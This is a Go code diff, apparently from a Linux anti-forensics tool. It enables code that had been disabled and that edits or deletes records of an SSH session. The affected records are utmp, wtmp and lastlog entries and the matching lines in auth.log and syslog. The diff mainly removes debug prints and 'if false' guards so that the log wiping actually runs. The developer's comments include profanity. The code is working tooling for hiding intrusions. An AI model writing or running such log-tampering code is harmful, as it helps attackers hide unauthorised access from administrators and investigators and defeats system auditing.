@@ -14,6 +14,7 @@ import (
 	bf "test/BF"
 	check "test/CHECK"
 	getpty "test/GETPTY"
+	lastlog "test/LASTLOG"
 	utmp "test/UTMP"
 	vars "test/VARS"
 	"time"
@@ -56,13 +57,11 @@ import (
 
 // 200 hundrend lines of pure pain just deleted
 
+// back here againe Fuck you  need sleep
+
 var indexToDel int64
 var count int64
 var ProxyIp [16]byte
-
-// const LASTLOG_FILE = "/var/log/lastlog"
-// const LINE_LENGTH = 292 // Size of each entry in lastlog (defined in /usr/include/lastlog.h)
-
 var play bool = true
 
 func init() {
@@ -102,17 +101,14 @@ func main() {
 				connectedData.TimeLoginSSHEpoch = myepoch
 				sessNum, err := utmp.GetSessionId(connectedData.TimeLoginSSHEpoch)
 				check.Check("error On Getting Session Number", err)
-				// connectedData.SessionNumber = sessNum
 				utmp.ClearUTMP(connectedData)
-				fmt.Println(sessNum, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
-				time.Sleep(10 * time.Second)
+				time.Sleep(5 * time.Second)
 				dataToInfl, _ := parceDataWtmpFile(connectedData)
 				dataToInfl.ConData.SessionNumber = sessNum
-				fmt.Println(dataToInfl, "CXAXAAXAXAXXAXAAXAXXAXAXAAXAXAXXAAX")
 
 				// ConvertIPToBytearray(&connectedData.IP)
 
-				// lastlog.ChangeLastLog(&connectedData.IP, &dataToInfl, &vars.ConnectedUser)
+				lastlog.ChangeLastLog(&connectedData.IP, &dataToInfl, &vars.ConnectedUser)
 				// /////////////////////////////////////////////////////////////////////////////
 				// sessionStart := int(dataToInfl.Time.Sec)
 				// sessionStop := int(dataToInfl.TimeEnd.Sec)
@@ -120,30 +116,10 @@ func main() {
 				// start, stop := authlog.GetTimeStamps(sessionStart, sessionStop)
 
 				// fmt.Println(sessionStart, sessionStop, connectedData.TimeLoginSSH, "AAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSS~~~~~~~~~~~~~~")
-				err = authlog.DeleteLineAuthLog(dataToInfl)
+				err = authlog.DeleteLineAuthLogAndSyslog(vars.AUTH_LOG, dataToInfl)
+				err = authlog.DeleteLineAuthLogAndSyslog(vars.SYSLOG, dataToInfl)
 				fmt.Println(err)
 
-				if false {
-					// check.Check("Delete Auth Log ", err)
-
-					// patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
-					// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, vars.SYSLOG)
-					// if err != nil {
-					// 	fmt.Println("Errpr", err)
-					// }
-					// ex, err := os.Executable()
-					// if err != nil {
-					// 	panic(err)
-					// }
-
-					// exPath := filepath.Dir(ex)
-					// patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
-					// check.Check("Error on delete Line Auth Log", err)
-					// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, vars.AUTH_LOG)
-					// if err != nil {
-					// 	fmt.Println(err)
-					// }
-				}
 			}
 		}
 		if false {
@@ -208,7 +184,7 @@ func parceDataWtmpFile(connectedUser vars.ConnectedData) (vars.DataToInfl, error
 			}
 		}
 		// bs, err := hex.DecodeString(record.Device)
-		if name == connectedUser.User && record.Type == 0x7 && connectedUser.SSHPTY == strings.TrimRight(string(record.Device[:]), "\x00") {
+		if name == connectedUser.User && record.Type == 0x7 { //&& connectedUser.SSHPTY == strings.TrimRight(string(record.Device[:]), "\x00") {
 
 			DtIN = append(DtIN, vars.DataToInfl{User: string(record.User[:]),
 				Pid: record.Pid,
@@ -225,9 +201,8 @@ func parceDataWtmpFile(connectedUser vars.ConnectedData) (vars.DataToInfl, error
 			for i, j := range DtIN {
 				// fmt.Println(j.Pid, record.Pid, j.Device, record.Device, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSSSSSSSSSSSSS")
 				if j.Pid == record.Pid && reflect.DeepEqual(j.Device, record.Device) {
-					fmt.Println("ASDASFASDOKASDKGFSAODKGFKASDOKFSADKFKSADOFKSADOKFSOADKFOSADKFSODK")
-					DtIN[i].Time.Sec = record.Time.Sec
-					DtIN[i].Time.Usec = record.Time.Usec
+					DtIN[i].TimeEnd.Sec = record.Time.Sec
+					DtIN[i].TimeEnd.Usec = record.Time.Usec
 				}
 			}
 		}
@@ -235,11 +210,10 @@ func parceDataWtmpFile(connectedUser vars.ConnectedData) (vars.DataToInfl, error
 	}
 
 	//////////////////////////////////////////////////////////////////////////////
-	if false {
-		err = deleteBytesFromFile(vars.WTMP, indexToDel*384, 384)
-		if err != nil {
-			fmt.Println(err)
-		}
+
+	err = deleteBytesFromFile(vars.WTMP, indexToDel*384, 384)
+	if err != nil {
+		fmt.Println(err)
 	}
 	//////////////////////////////////////////////////////////////////////////////
 	slices.Reverse(DtIN)
@@ -260,7 +234,7 @@ func parceDataWtmpFile(connectedUser vars.ConnectedData) (vars.DataToInfl, error
 		return finalDtI, nil
 	} else {
 		fmt.Println("PRINT THEM")
-		time.Sleep(60 * time.Second)
+		// time.Sleep(60 * time.Second)
 		return vars.DataToInfl{}, nil
 
 	}
@@ -297,3 +271,25 @@ func deleteBytesFromFile(filePath string, start int64, count int64) error { //wt
 
 	return nil
 }
+
+// if false {
+// check.Check("Delete Auth Log ", err)
+
+// patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
+// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, vars.SYSLOG)
+// if err != nil {
+// 	fmt.Println("Errpr", err)
+// }
+// ex, err := os.Executable()
+// if err != nil {
+// 	panic(err)
+// }
+
+// exPath := filepath.Dir(ex)
+// patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
+// check.Check("Error on delete Line Auth Log", err)
+// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, vars.AUTH_LOG)
+// if err != nil {
+// 	fmt.Println(err)
+// }
+// }
